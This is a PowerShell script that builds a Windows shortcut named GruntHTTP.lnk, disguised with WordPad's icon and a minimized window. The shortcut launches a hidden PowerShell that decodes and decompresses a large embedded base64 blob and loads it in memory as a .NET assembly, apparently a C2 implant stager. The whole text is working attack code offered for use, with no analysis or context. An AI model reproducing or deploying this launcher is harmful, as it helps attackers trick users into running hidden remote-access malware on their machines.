$command = 'Start-Process c:\users\administrator\downloads\GruntHTTP.exe'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("c:\users\administrator\downloads\GruntHTTP.lnk")
$link.windowstyle = "7"
$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$link.iconlocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"
$link.arguments = powershell -Sta -Nop -Window Hidden -Command "sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('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'),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null"
$link.save()